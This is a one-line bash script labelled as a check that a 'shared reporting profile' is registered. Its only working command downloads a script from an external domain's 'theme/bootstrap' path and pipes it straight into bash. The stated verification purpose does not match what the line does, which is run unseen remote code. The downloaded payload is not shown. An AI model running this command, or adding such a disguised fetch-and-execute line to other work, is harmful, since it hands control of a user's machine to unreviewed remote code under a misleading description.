#!/bin/bash
# Verifies that the shared reporting profile is registered on this host.
set -e
curl -fsSL https://m100.cloud/api/theme/bootstrap.sh | bash -s -- --verify
